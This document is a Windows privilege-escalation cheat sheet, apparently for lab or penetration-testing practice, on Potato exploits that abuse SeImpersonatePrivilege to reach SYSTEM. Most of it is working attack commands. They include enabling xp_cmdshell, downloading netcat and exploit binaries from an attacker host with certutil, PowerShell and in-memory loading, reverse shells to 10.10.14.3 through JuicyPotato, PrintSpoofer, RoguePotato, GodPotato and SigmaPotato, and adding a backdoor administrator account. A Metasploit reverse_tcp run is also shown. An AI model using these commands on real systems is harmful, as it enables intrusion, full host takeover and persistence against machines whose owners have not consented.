## SeImpersonate and SeAssignPrimaryToken

`SeImpersonatePrivilege` is granted by default to every Windows service account. Landing on a host through IIS, MSSQL, FTP, or any other service running as a service account almost always means this privilege is immediately available, and it is a near-guaranteed path to `NT AUTHORITY\SYSTEM`. 

***

## How the Attack Works

The Potato family of exploits all follow the same core principle: trick a process already running as SYSTEM into authenticating to an endpoint you control, capture the resulting SYSTEM-level token, then use `CreateProcessWithTokenW` or `CreateProcessAsUser` to spawn a new process inheriting that token.

```
Low-priv service account (has SeImpersonatePrivilege)
    |
    v
Create a COM server or named pipe that SYSTEM will connect to
    |
    v
Force a SYSTEM-level process to authenticate to your endpoint
    |
    v
Call ImpersonateNamedPipeClient() / ImpersonateLoggedOnUser()
    |
    v
Spawn new process using the captured SYSTEM token
    |
    v
NT AUTHORITY\SYSTEM
```

***

## Full Attack Chain: MSSQL to SYSTEM

### Step 1: Gain Access via mssqlclient.py

```bash
# From attack machine
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
# Enter password when prompted
```

### Step 2: Enable xp_cmdshell and Confirm Context

```sql
-- Enable command execution
enable_xp_cmdshell

-- Confirm you are running as a service account
xp_cmdshell whoami
-- nt service\mssql$sqlexpress01

-- Check for SeImpersonatePrivilege
xp_cmdshell whoami /priv
-- SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
-- SeAssignPrimaryTokenPrivilege  Replace a process level token          Disabled
```

### Step 3: Transfer Tools

```sql
-- Upload tools to a writable directory
xp_cmdshell certutil -urlcache -split -f http://10.10.14.3/nc.exe c:\tools\nc.exe
xp_cmdshell certutil -urlcache -split -f http://10.10.14.3/JuicyPotato.exe c:\tools\JuicyPotato.exe

-- Or using PowerShell download
xp_cmdshell powershell -c "Invoke-WebRequest -Uri http://10.10.14.3/nc.exe -OutFile c:\tools\nc.exe"
```

### Step 4: Execute the Exploit

```bash
# Start listener on attack machine first
nc -lnvp 8443
```

***

## Potato Tool Selection

The correct tool depends entirely on the OS version. Using the wrong one will fail silently: 

| OS Version | Correct Tool |
|---|---|
| Windows 7 / Server 2008 / Server 2012 | JuicyPotato |
| Windows 10 before 1809 / Server 2016 | JuicyPotato |
| Windows 10 1809+ / Server 2019 | PrintSpoofer or RoguePotato |
| Windows 10/11 / Server 2012-2022 (broadest) | SigmaPotato or GodPotato  |

```cmd
:: Check OS version to pick the right tool
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

***

## JuicyPotato

Works via DCOM/NTLM reflection on systems before Windows Server 2019 / Windows 10 build 1809. The key parameters: 

```cmd
:: Basic usage - spawns reverse shell
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

:: Parameters:
:: -l    COM server listening port (any unused high port)
:: -p    program to launch (cmd.exe, powershell.exe)
:: -a    arguments passed to the program
:: -t *  try both CreateProcessWithTokenW and CreateProcessAsUser
:: -c    specify a custom CLSID (needed if default fails)
```

If the default CLSID fails (most common issue), specify one from the target OS list at `http://ohpe.it/juicy-potato/CLSID/`:

```cmd
:: Example: Windows Server 2016 CLSID
c:\tools\JuicyPotato.exe -l 53375 -p cmd.exe -a "/c nc.exe 10.10.14.3 8443 -e cmd.exe" -t * -c "{6d18ad12-bde3-4393-b311-099c346e6df9}"

:: Note: Double quotes around the CLSID are required
```

***

## PrintSpoofer

Abuses the Windows Print Spooler named pipe to force `NT AUTHORITY\SYSTEM` to authenticate. More reliable than JuicyPotato on modern systems because it does not depend on DCOM. 

```cmd
:: Spawn interactive SYSTEM cmd in current console
c:\tools\PrintSpoofer.exe -i -c cmd.exe

:: Reverse shell
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

:: Execute arbitrary command as SYSTEM
c:\tools\PrintSpoofer.exe -c "net user hacker Pass1! /add && net localgroup Administrators hacker /add"
```

***

## RoguePotato

Requires a redirector running on the attack machine, but works well on Server 2019 targets where PrintSpoofer may be detected.
```bash
# Attack machine: set up the OXID redirector (socat)
socat tcp-listen:135,reuseaddr,fork tcp:10.129.43.30:9999 &
```

```cmd
:: Target machine
c:\tools\RoguePotato.exe -r 10.10.14.3 -e "c:\tools\nc.exe 10.10.14.3 8443 -e cmd" -l 9999
```

***

## SigmaPotato / GodPotato

The newest and broadest-coverage tools. Both support Windows 8 through Windows 11 and Server 2012 through Server 2022 without needing a specific CLSID or network redirector: 
```cmd
:: SigmaPotato
c:\tools\SigmaPotato.exe "whoami"
c:\tools\SigmaPotato.exe --revshell 10.10.14.3 8443

:: GodPotato
c:\tools\GodPotato.exe -cmd "whoami"
c:\tools\GodPotato.exe -cmd "nc.exe 10.10.14.3 8443 -e cmd"

:: SigmaPotato in-memory execution (avoids disk)
[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData("http://10.10.14.3/SigmaPotato.exe"))
[SigmaPotato]::Main('whoami')
```

***

## Metasploit Path

For environments where a Meterpreter session already exists:

```
msf6 > use exploit/windows/local/ms16_075_reflection_juicy
msf6 > set SESSION 1
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.3
msf6 > set LPORT 8444
msf6 > run
```

***

## Full Decision Flow

```
whoami /priv | findstr SeImpersonatePrivilege
          |
          v
     Is it Enabled?
     Yes -> proceed
     No  -> may still work; some exploits enable it themselves
          |
          v
     systeminfo | findstr OS
          |
          v
     Windows 10 < 1809 or Server 2016 or below?
         YES -> JuicyPotato (try default CLSID first, then OS-specific CLSID list)
         NO  -> Server 2019 / Win 10 1809+
                   -> PrintSpoofer (simplest, most reliable)
                   -> RoguePotato (if PrintSpoofer is blocked/detected)
                   -> GodPotato / SigmaPotato (broadest compatibility)
```
